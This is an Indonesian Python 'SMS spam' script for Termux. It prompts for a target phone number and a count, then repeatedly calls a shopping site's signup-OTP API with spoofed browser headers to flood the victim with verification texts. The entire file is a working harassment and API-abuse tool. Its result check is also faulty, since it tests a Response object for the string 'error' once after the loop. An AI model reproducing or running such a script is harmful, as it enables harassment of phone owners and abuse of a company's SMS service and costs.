#!/bin/python

#module
import json
import requests
import sys
import os

def main():
        os.system('clear')
        os.system('figlet Spam Pesan')
        banner = '''
=======================================
=    (+)Author    : Reza Alfauzan     =
=    (+)Youtube   : Reja Gaming       =
=    (+)Facebook  : Rzaa Ajaa         =
=    (+)Pesan     : Jangan Recode Ya  =
=    (+)Pesan     : Gua Masih Noob    =
=======================================
====> Coded By Reza <====
> Welcome To Termux <
====> Gua Ganteng:v <====
'''

        print(banner)
        no = input('Nomor Target ==> : ')
        jum = input('Jumlah Spam ==> :')

        head = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
        "Referer": "https://www.mapclub.com/en/user/signup",
        "Host": "cmsapi.mapclub.com",
        }
        
        dat = {
        'phone' : no
        }
        
        
        for x in range(int(jum)):
                leosureo =requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
        if 'error' in leosureo:
                print('Gagal Mengirimn:)' + no)
        else:
                print('Berhasil Mengirim :' + no)
main()
